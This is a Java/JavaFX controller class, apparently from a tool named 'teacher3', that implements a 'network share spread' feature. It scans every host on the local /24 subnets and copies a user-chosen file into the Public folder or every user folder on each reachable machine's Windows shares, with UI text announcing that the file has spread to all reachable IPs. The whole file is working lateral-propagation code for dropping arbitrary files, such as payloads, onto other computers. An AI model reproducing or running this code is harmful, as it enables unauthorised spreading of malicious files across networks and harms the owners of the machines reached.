package com.godpalace.teacher3.fx.menu.spread.network_share;

import com.godpalace.teacher3.Main;
import com.godpalace.teacher3.fx.message.Notification;
import com.godpalace.teacher3.manager.ThreadPoolManager;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.stage.FileChooser;
import lombok.extern.slf4j.Slf4j;
import org.kordamp.ikonli.boxicons.BoxiconsRegular;
import org.kordamp.ikonli.javafx.FontIcon;
import org.pomo.toasterfx.model.impl.ToastTypes;

import java.io.File;
import java.net.InetAddress;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.file.StandardOpenOption;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

@Slf4j
public class NetworkShareSpreadController {
    @FXML
    public TextField pathTextField;

    @FXML
    public TextField putTextField;

    @FXML
    public ToggleGroup selectUser;

    @FXML
    public TextField threadTextField;

    @FXML
    public ProgressBar progress;

    @FXML
    public TextArea infoTextArea;

    @FXML
    public RadioButton publicUserRadio;

    @FXML
    public RadioButton allUserRadio;

    @FXML
    public Button startButton;

    @FXML
    public Button selectFileButton;

    @FXML
    public void initialize() {
        threadTextField.setText(Runtime.getRuntime().availableProcessors() * 4 + "");
    }

    @FXML
    public void onSelectFile() {
        FileChooser chooser = new FileChooser();
        chooser.setTitle("请选择要投放的文件");
        chooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("所有文件", "*.*"));

        File file = chooser.showOpenDialog(pathTextField.getScene().getWindow());
        if (file != null) {
            pathTextField.setText(file.getAbsolutePath());
        }
    }

    @FXML
    public void onStartSpread() {
        String path = pathTextField.getText();
        String putPath = putTextField.getText();
        String thread = threadTextField.getText();

        if (path.isEmpty() || thread.isEmpty()) {
            error("请填写所有必填项！");
            return;
        }

        File srcFIle = new File(path);
        if (!srcFIle.exists()) {
            error("文件不存在！");
            return;
        }

        int threadNum;
        try {
            threadNum = Integer.parseInt(thread);

            if (threadNum <= 0) {
                error("线程数必须大于0!");
                return;
            }
        } catch (NumberFormatException e) {
            error("线程数必须为整数!");
            return;
        }

        RadioButton selectedUser = (RadioButton) selectUser.getSelectedToggle();
        boolean isPublicUser = selectedUser.equals(publicUserRadio);

        ThreadPoolManager.getExecutor().execute(() -> {
            final Object lock = new Object();

            infoTextArea.clear();
            infoTextArea.appendText("传播已开始\n");
            setAllDisable(true);
            progress.setProgress(0.0D);

            ThreadPoolExecutor executor = new ThreadPoolExecutor(threadNum, threadNum, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());
            for (InetAddress address : Main.getIpv4s().keySet()) {
                String[] ipSeg = address.getHostAddress().split("\\.");

                for (int i = 1; i <= 254; i++) {
                    String ip = ipSeg[0] + "." + ipSeg[1] + "." + ipSeg[2] + "." + i;
                    executor.execute(() -> {
                        try {
                            if (!InetAddress.getByName(ip).isReachable(1000)) return;

                            if (isPublicUser) {
                                File file = new File("\\\\" + ip + "\\Users\\Public\\" + putPath);
                                if (file.exists()) {
                                    FileChannel in = FileChannel.open(srcFIle.toPath(), StandardOpenOption.READ);

                                    File target = new File(file, srcFIle.getName());
                                    FileChannel out = FileChannel.open(target.toPath(),
                                            StandardOpenOption.CREATE, StandardOpenOption.WRITE);

                                    ByteBuffer buffer = ByteBuffer.allocate(1024);
                                    while (in.read(buffer) != -1) {
                                        buffer.flip();
                                        out.write(buffer);
                                        buffer.clear();
                                    }

                                    in.close();
                                    out.close();

                                    infoTextArea.appendText("已在\"" + file.getAbsolutePath() + "\"中投放文件\"" + srcFIle.getName() + "\"\n");
                                }
                            } else {
                                File root = new File("\\\\" + ip + "\\Users");
                                File[] files = root.listFiles((dir, name) -> !name.equals("Public"));

                                if (files != null) {
                                    for (File file : files) {
                                        FileChannel in = FileChannel.open(srcFIle.toPath(), StandardOpenOption.READ);

                                        File target = new File(file, srcFIle.getName());
                                        FileChannel out = FileChannel.open(target.toPath(),
                                                StandardOpenOption.CREATE, StandardOpenOption.WRITE);

                                        ByteBuffer buffer = ByteBuffer.allocate(1024);
                                        while (in.read(buffer) != -1) {
                                            buffer.flip();
                                            out.write(buffer);
                                            buffer.clear();
                                        }

                                        in.close();
                                        out.close();

                                        infoTextArea.appendText("已在\" + file.getAbsolutePath() + \"中投放文件\"" + srcFIle.getName() + "\"\n");
                                    }
                                }
                            }
                        } catch (Exception e) {
                            infoTextArea.appendText("IP: " + ip + "投放失败!\n");
                        } finally {
                            synchronized (lock) {
                                progress.setProgress(progress.getProgress() + 1.0D / (Main.getIpv4s().size() * 254));
                            }
                        }
                    });
                }
            }

            try {
                executor.shutdown();

                while (executor.getActiveCount() > 0) {
                    synchronized (this) {
                        wait(1000);
                    }
                }
            } catch (InterruptedException e) {
                log.error("InterruptedException", e);
            }

            setAllDisable(false);
            infoTextArea.appendText("传播已结束\n");

            Notification.show("传播已结束", "文件已成功传播到所有可达的IP地址！", ToastTypes.INFO);
        });
    }

    private void error(String message) {
        Alert alert = new Alert(Alert.AlertType.ERROR);
        alert.setGraphic(new FontIcon(BoxiconsRegular.ERROR));
        alert.setTitle("错误");
        alert.setHeaderText(null);
        alert.setContentText(message);
        alert.showAndWait();
    }

    private void setAllDisable(boolean disable) {
        pathTextField.setDisable(disable);
        putTextField.setDisable(disable);
        threadTextField.setDisable(disable);

        publicUserRadio.setDisable(disable);
        allUserRadio.setDisable(disable);

        selectFileButton.setDisable(disable);
        startButton.setDisable(disable);
    }
}
